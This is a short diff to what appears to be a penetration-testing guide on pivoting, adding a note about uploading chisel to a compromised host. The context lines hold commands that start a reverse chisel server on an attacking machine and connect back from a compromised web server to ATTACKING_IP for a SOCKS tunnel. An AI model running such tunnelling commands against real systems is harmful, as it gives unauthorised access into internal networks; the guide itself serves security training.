@@ -182,7 +182,7 @@ On the attacking host:
 v4resk@kali$ ./chisel server -p LISTEN_PORT --reverse &
 ```
 
-On the compromised host, we use the following command:
+On the compromised host, after uploading chisel, we use the following command:
 
 ```bash
 www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
